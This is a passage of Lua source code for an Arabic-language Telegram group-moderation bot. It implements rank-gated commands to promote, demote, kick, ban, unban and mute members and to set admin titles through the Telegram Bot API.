DevaMeR:sadd(LanZo..'aMeR:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المنظفين")  
end
--     Source LanZo     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المنظفين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المنظفين")  
end end
--     Source LanZo     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة الادمنيه")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة الادمنيه")  
end
--     Source LanZo     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة الادمنيه")  
end end
--     Source LanZo     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المميزين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المميزين")  
end
--     Source LanZo     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المميزين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المميزين")  
end end 
--     Source LanZo     --
if aMeRConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..LanZo)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مشرف في المجموعه")  
else
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..LanZo)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من مشرفين المجموعه")  
else
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..LanZo)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مشرف في جميع الصلاحيات")  
else
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
local aMeR = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..LanZo)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم اضافة ↫ "..aMeR.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&custom_title="..aMeR)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙ليست لدي صلاحية اضافة مشرفين جدد يرجى التحقق من الصلاحيات', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'لقبه' and ChCheck(msg) then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'᥀︙ليس لديه لقب هنا') 
else
send(msg.chat_id_, msg.id_,'᥀︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)) 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'لقبي' and ChCheck(msg) then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'᥀︙ليس لديك لقب هنا') 
else
send(msg.chat_id_, msg.id_,'᥀︙لقبك ↫ '..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)) 
end
end
if text == "راسلني" and ChCheck(msg) then
LanZoTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,LanZoTeam[math.random(#LanZoTeam)])
end
--     Source LanZo     --
if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('صلاحيته') or text ==('صلاحياته') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')) and ChCheck(msg) then
local username = text:match('^صلاحيته @(.*)') or text:match('^صلاحياته @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحياته (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
Validity(msg,ValidityId)  
end
--     Source LanZo     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$") or text:match("^↫ اخفاء الكيبورد ᥀$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end end end
--     Source LanZo     --
if aMeRConstructor(msg) then
if text == "تفعيل الحظر" and ChCheck(msg) and SourceCh(msg) or text == "تفعيل الطرد" and ChCheck(msg) and SourceCh(msg) then
DevaMeR:del(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الطرد والحظر'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الحظر" and ChCheck(msg) and SourceCh(msg) or text == "تعطيل الطرد" and ChCheck(msg) and SourceCh(msg) then
DevaMeR:set(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_,"true")
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الطرد والحظر'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
if text == "تفعيل الكتم" and ChCheck(msg) and SourceCh(msg) or text == "تفعيل التقييد" and ChCheck(msg) and SourceCh(msg) then
DevaMeR:del(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الكتم والتقيد'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
if text == "تعطيل الكتم" and ChCheck(msg) and SourceCh(msg) or text == "تعطيل التقييد" and ChCheck(msg) and SourceCh(msg) then
DevaMeR:set(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_,"true")
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الكتم والتقيد'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
end
if aMeRConstructor(msg) then
if text == "تفعيل الرفع" and ChCheck(msg) and SourceCh(msg) or text == "تفعيل الترقيه" and ChCheck(msg) and SourceCh(msg) then
DevaMeR:del(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) and SourceCh(msg) or text == "تعطيل الترقيه" and ChCheck(msg) and SourceCh(msg) then
DevaMeR:set(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_,"true")
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source LanZo     --
--          Kick          --
if Admin(msg) then
if text ==('طرد') and ChCheck(msg) and SourceCh(msg) then
function KickReply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) and SourceCh(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) and SourceCh(msg) then
local user = text:match('طرد (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source LanZo     --
--          Ban           --
if Admin(msg) then
if text ==('حضر') or text ==('حظر') and ChCheck(msg) and SourceCh(msg) then
function BanReply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevaMeR:sadd(LanZo..'aMeR:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) and SourceCh(msg) then
local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevaMeR:sadd(LanZo..'aMeR:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) and SourceCh(msg) then
local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"᥀︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevaMeR:sadd(LanZo..'aMeR:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم حظره من المجموعه")  
end,nil) 
end
end
--     Source LanZo     --
--         UnBan          --
if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء حظره من المجموعه")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
DevaMeR:srem(LanZo..'aMeR:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء حظره من المجموعه")  
end 
end 
--     Source LanZo     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevaMeR:sismember(LanZo..'aMeR:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevaMeR:sadd(LanZo..'aMeR:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
